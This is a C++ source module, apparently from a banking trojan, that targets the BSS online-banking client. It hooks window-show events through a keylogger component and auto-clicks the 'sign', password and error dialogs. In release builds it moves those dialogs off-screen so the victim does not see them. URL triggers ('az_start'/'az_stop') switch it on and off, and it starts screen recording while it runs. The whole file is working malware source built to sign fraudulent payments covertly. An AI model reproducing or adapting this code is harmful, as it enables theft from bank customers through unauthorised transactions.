

#include "bsssign.h"
#include "Memory.h"
#include "GetApi.h"
#include "Splice.h"
#include "Strings.h"
#include "Utils.h"
#include "Unhook.h"
#include "WndUtils.h"
#include "ScreenShots.h"
#include "Loader.h"
#include "VideoRecorder.h"
#include "UniversalKeyLogger.h"
#include "BotClasses.h"


#include "BotDebug.h"

namespace bsssign_Template
{
    #include "DbgTemplates.h"
}
#define BDBG  bsssign_Template::DBGOutMessage<>



//----------------------------------------------------------------------------

// ���������� ���������� ���������� ����� �������� ����
#if !defined(DEBUGCONFIG) && !defined(DEBUGBOT)
	#define BSSSIGN_HIDE_WND
#endif


// ��� ����� ������ ����� ������������
#define BSS_FORM_CLASS_HASH 0xF8047238 /* obj_Form */

// ��� ����� ������ ����
#define BSS_BUTTON_CLASS_HASH 0xB84059EC /* obj_BUTTON */

// ��� ��������� ��������� �������
#define BSS_SIGN_FORM_CAPTION_HASH 0x4DFAF875 /* ������� */

// ��������� ������ �������
#define BSS_SIGN_BUTTON_CAPTION_HASH 0xBE1A55FD /* ��������� */

// ��������� ������ ��������
#define BSS_CLOSE_BUTTON_CAPTION_HASH 0xAE1E1985 /* ������� */


//----------------------------------------------------------------------------
DWORD  BSSClickToButtons(HWND Form, bool MultiClick, DWORD BtnCaptionHash)
{
	// ���������� �������� ���� ������������ ������ � ���������
	DWORD Count = 0;
	HWND Button = NULL;
	do
	{
//		Button = (HWND)pFindWindowExA(Form, Button, BSSSign::ButtonClassName, NULL);

		Button = (HWND)pFindWindowExA(Form, Button, NULL, NULL);
		if (Button == NULL) break;

		DWORD Hash = GetWndTextHash(Button);

		// ��������� ��������� ������
		if (Hash != BtnCaptionHash)
		{
			Count += BSSClickToButtons(Button, MultiClick, BtnCaptionHash);
			if (Count && !MultiClick)
				return Count;
			continue;
		}

		// ������� �� ������
		if (HardClickToWindow(Button, Random::Generate(6, 30), Random::Generate(6, 15)))
		{
			Count++;
			pSleep(Random::Generate(1000, 1500));
			if (!MultiClick) break;
        }
	}
	while (true);

	return Count;
}



enum TBSSFormType   {bfSign, bfPassword, bfError};
enum TBSSFormStatus {bfsUnknown, bfsClicked, bfsWait, bfsReady};


class TBSSClicker;


//***********************************************
//  TBSSForm - ���� ������� BSS
//***********************************************
class TBSSForm : public TBotCollectionItem
{
protected:
	HWND FForm;
	TBSSFormStatus FStatus;
	DWORD FClickTime;
	DWORD FMaxWaitInterval;

	// ������� ���������� ����
	void Move(int x, int y)
	{
		RECT R;
		if (!pGetWindowRect(FForm, &R)) return;

		int W = R.right - R.left;
		int H = R.bottom - R.top;
		pMoveWindow(FForm, x, y, W, H, FALSE);
	}

	// ������� �� ����������� ������� �����
	bool virtual Click()
	{
		FClickTime = (DWORD)pGetTickCount();
		FStatus = bfsClicked;
		return true;
	}

	// ������� ��������� ��������� ����
	void virtual Wait()
	{
		DWORD Interval = (DWORD)pGetTickCount() - FClickTime;
		if (Interval > FMaxWaitInterval || !(BOOL)pIsWindowVisible(FForm))
            FStatus = bfsReady;
    }

public:
	// �����������
	TBSSForm(TBSSClicker* aOwner, HWND Wnd)
		: TBotCollectionItem((TBotCollection*)aOwner)
	{
		FForm = Wnd;
		FStatus = bfsUnknown;
		FMaxWaitInterval = 10000; // �������� 10 ������ �������� ��������
	}
    //------------------------------------------------------------------------

	// ��������� �������� � �����
	TBSSFormStatus virtual Execute()
	{
		switch (FStatus) {
			case bfsUnknown: Click(); break;            // ������� �� �������
			case bfsClicked: FStatus = bfsWait; break;  // ��������� � ����� ��������
			case bfsWait:    Wait(); break;             // ������� �������� ����
		}

		return FStatus;
	}
	//------------------------------------------------------------------------

};

//***********************************************
// ���� ��������� ��������
//***********************************************
class TBSSSignForm : public TBSSForm
{
protected:
    bool FCloseBtnClicked;
	// ������� �� ������� ��������� �������
	bool Click()
	{
		DWORD Count = BSSClickToButtons(FForm, true, BSS_SIGN_BUTTON_CAPTION_HASH);
		BDBG("bsssign","������� ���������. ������ ������ %d", Count);
        TBSSForm::Click();
        return Count > 0;
    }

	// ������� ��������� ������ ���� ��������� ��������
	void Wait()
	{
		if (Owner()->Count() > 1)
			return;
        TBSSForm::Wait();
	}

public:
	TBSSSignForm(TBSSClicker* aOwner, HWND Wnd)
		: TBSSForm(aOwner, Wnd)
	{
		BDBG("bsssign","����������� ���� ��������� ��������");
		#ifdef BSSSIGN_HIDE_WND
            Move(-1000, 0);
		#endif
	};


	TBSSFormStatus Execute()
	{
		// � ������ ���� ���� ������� ���� �� ������ � ��
		// �� �� ���������� ������ ������� ������� �� ���
		if (FStatus == bfsWait && !FCloseBtnClicked)
		{
			if (Owner()->Count() == 1)
			{
				FCloseBtnClicked = true;
				BSSClickToButtons(FForm, false, BSS_CLOSE_BUTTON_CAPTION_HASH);
			}

			return bfsWait;
		}

		return TBSSForm::Execute();
    }

	// ������� ����� ������ ���� ���� �������� ����� ��������� �������
	bool static IsSignForm(DWORD ClassHash, DWORD TextHash)
	{
		return ClassHash == BSS_FORM_CLASS_HASH &&
		       TextHash  == BSS_SIGN_FORM_CAPTION_HASH;
	}
};

//***********************************************
//����� �������� ����� ������
//***********************************************
class TBSSPasswordForm : public TBSSForm
{
public:
	TBSSPasswordForm(TBSSClicker* aOwner, HWND Wnd)
		: TBSSForm(aOwner, Wnd)
	{
		// ��� ���� ����� ������ ����� ������ ������� �����
		BDBG("bsssign","����������� ���� ����� ������");
    	FMaxWaitInterval = 3 * 60 * 1000;
	}

    // ��������� �������� �� ���� ����� ����� ������
	bool static IsPasswordForm(TBSSClicker* Clicker, HWND WND, const string& Text)
	{
		// ���� ������: ���� ������ ���� ��������, �� ����� ��������.
		if (((TBotCollection*)Clicker)->Count() == 0 || pGetParent(WND) != NULL)
			return false;

		// ���� ������: ��������� ��������� ����� ������
		// ��� ������ ��� ����� ������ ��������� ����
		return Text.Pos("������") >= 0;

		/* TODO :
		��� ��������� �������������� ������ �� ���� ����� ������
		������������ ���������� ���������� ����. */
    }
};


//***********************************************
// ����� �������� �� ���� ������ ���������
// �� ������
//***********************************************
class TBSSErrorForm : public TBSSForm
{
protected:
	DWORD FTextHash;
	DWORD FClassHash;

	bool Click()
	{
		// ������� �� ������ Ok
		bool Clicked = BSSClickToButtons(FForm, false, FTextHash) > 0;
		TBSSForm::Click();
		return Clicked;
	}

public:
	TBSSErrorForm(TBSSClicker* aOwner, HWND Wnd)
		: TBSSForm(aOwner, Wnd)
	{
		BDBG("bsssign","����������� ���� ������");
		#ifdef BSSSIGN_HIDE_WND
            Move(-1000, 0);
		#endif

		FTextHash = 0x27EB /* Ok */;
		//FTextHash = 0x18B5 /* �� */; // ��� ������
		FClassHash = 0;
	};

	// ������� ���������� ������ ���� ��� ���� ������
	bool static IsErrorForm(TBSSClicker* Clicker, DWORD ClassHash, DWORD TextHash)
	{
		//return  TextHash  == 0x72E78B17 /* ������ */;

		return  ((TBotCollection*)Clicker)->Count() > 0 &&
				ClassHash == BSS_FORM_CLASS_HASH &&
				TextHash  == 0x72E78B17 /* ������ */;
    }

};


//****************************************************************************
//  ����� �������� �� ������� �����
//****************************************************************************

class TBSSClicker : public TBotCollection
{
private:
	bool FActive;
	bool FRunning;

	friend DWORD WINAPI BSSClickerThreadMethod(LPVOID Clicker);


	// ������� ������� �� ����� ������� BSS
	void Execute()
	{
		// ��������� ���� ���� � ��������� ���� ����
		pSleep(500);

		do
		{
			for (int i = 0; i < Count();)
			{
				TBSSForm* Form = (TBSSForm*)Items(i);
				TBSSFormStatus Status = Form->Execute();
				if (Status == bfsReady)
					delete Form;
				else
                    i++;
			}

			pSleep(500);


			// ��������� ������������� ����������
			TLock L = GetLocker();
			FRunning = Count() > 0;
            if (!FRunning) break;
		}
		while (true);
	}
    //------------------------------------------------------------------------




public:
	//  Constructor
	TBSSClicker() : TBotCollection()
	{
		FRunning = false;
		SetThreadSafe();
		FActive = false;
	};
	//------------------------------------------------------------------------

	void SetActive(bool Value)
	{
		BDBG("bsssign","��������� ������� BSS �������. �������=%d", Value);
        FActive = Value;
	}
	//------------------------------------------------------------------------

    // ��������� ����� ��� �����
	bool AddForm(HWND WND)
	{
        if (!FActive) return false;

		string Text      = GetWndText2(WND);
		string Class     = GetWndClassName2(WND);
		DWORD  TextHash  = Text.Hash();
		DWORD  ClassHash = Class.Hash();

		TBSSForm* Form = NULL;

		BDBG("bsssign","������������ ����: \r\n  Class: %s \r\n  Text: %s", Class.t_str(), Text.t_str());

        // ��������� ���� ��������� ��������
		if (TBSSSignForm::IsSignForm(ClassHash, TextHash))
			Form = new TBSSSignForm(this, WND);
		else
		// ��������� ���� ����� ������
		if (TBSSPasswordForm::IsPasswordForm(this, WND, Text))
			Form = new TBSSPasswordForm(this, WND);
		else
		// ������� ���� ������
		if (TBSSErrorForm::IsErrorForm(this, ClassHash, TextHash))
			Form = new TBSSErrorForm(this, WND);



		if (!Form) return false;

		// ��������� �����
		TLock L = GetLocker();
		if (!FRunning)
		{
			FRunning = true;
			StartThread(BSSClickerThreadMethod, this);
		}

		return true;
	}
	//-------------------------------------------------------------------------
};



DWORD WINAPI BSSClickerThreadMethod(LPVOID Clicker)
{
    ((TBSSClicker*)Clicker)->Execute();
    return 0;
}


//***********************************************************************
//  ���������� ������ BSSSign
//***********************************************************************
namespace BSSSign
{
	char BSSSignName[] = {'B','S','S','S','i','g','n', 0};
	//----------------------------------------------------


    TBSSClicker* Clicker = NULL; // ������� �������� �� ������� BSS

	bool RecordVideo = false;
	RECT WindowRect;


	// ��� ����������� ����
	void WINAPI Event_ShowWindow(PKeyLogger, DWORD, LPVOID Data);

	// ������� ����������� �����
	DWORD WINAPI SignPayment(LPVOID Data);

}

//***********************************************************************


//----------------------------------------------------------------------------
void WINAPI BSSSign::Event_ShowWindow(PKeyLogger, DWORD, LPVOID Data)
{
    // ������������ ����������� ����
	PShowWindowData WndData = (PShowWindowData)Data;
	int Cmd = WndData->Command;
	HWND Wnd = WndData->Window;

	if (Cmd == SW_SHOW || Cmd == SW_SHOWNORMAL)
		Clicker->AddForm(Wnd);
}
//----------------------------------------------------------------------------

void BSSSign::CheckRequest(PCHAR URL)
{
	//  ������� ��������� ������ �� �������
	//  ����� ������� �� ������� ������� � ��
	//  ������� ����������

	if (STR::IsEmpty(URL))
		return;


	if ( CompareUrl( "*az_start", URL ) )
	{
		Clicker->SetActive(true);

		// ���� � ������� �������� �� �������� ������ �����
		// �� ������������� �������� �
		RecordVideo = !VideoRecorderSrv::PingClient(0);
		if (RecordVideo)
			RecordVideo = VideoRecorderSrv::StartRecording(BSSSignName);

	}
	else
	if ( CompareUrl( "*az_stop", URL ) )
	{
		Clicker->SetActive(false);
		if (RecordVideo)
		{
			RecordVideo = false;
			VideoRecorderSrv::StopRecording();
        }
	}
//	else
//	if ( CompareUrl( "*blind_up", URL ) )
//	{
//
//		BDBG("bsssign","Blind=true; ������ ������ ������� ���� ��");
//		Blind = true;
//	}
//	else
//	if ( CompareUrl( "*blind_down", URL ) )
//	{
//		BDBG("bsssign","���������� ��������� ����");
//		pEnumWindows((WNDENUMPROC)EnumWindowsIE, NULL);
//
//		Blind = false;
//	}
//	else
//	if ((CompareUrl( "*move_up", URL)) && (!Move))
//	{
//
//		BDBG("bsssign","���� �� � �����");
//		HWND Wind = (HWND)pFindWindowA("IEFrame", NULL);
//		pGetWindowRect(Wind,&WindowRect);
//		int x =(int)pGetSystemMetrics( SM_CXSCREEN );
//		int y =(int)pGetSystemMetrics( SM_CYSCREEN );
//
//		BDBG("bsssign","���� �� � ����� %d",x);
//		BDBG("bsssign","���� �� � ����� %d",y);
//		pMoveWindow(Wind,x,0,WindowRect.right-WindowRect.left,WindowRect.bottom-WindowRect.top,FALSE);
//
//		Move=true;
//	}
//	else
//	if (( CompareUrl( "*move_down", URL ) )&&(Move))
//	{
//		BDBG("bsssign","���� �� �� �����");
//		HWND Wind = (HWND)pFindWindowA("IEFrame",NULL);
//		pMoveWindow(Wind,WindowRect.left ,WindowRect.top ,WindowRect.right-WindowRect.left,WindowRect.bottom - WindowRect.top,TRUE);
//
//		Move = false;
//	}
}

//-----------------------------------------------------------------------------

void BSSSign::Initialize()
{
	// ������� �������������� ������� ������� BSS
	BDBG("bsssign","�������������� BSS ������");

	Clicker = new TBSSClicker();

	RecordVideo = false;

	bool Connected = KeyLogger::ConnectEventHandler(KLE_SHOW_WND, Event_ShowWindow);
	if (Connected)
    	BDBG("bsssign","������� ����������");
}




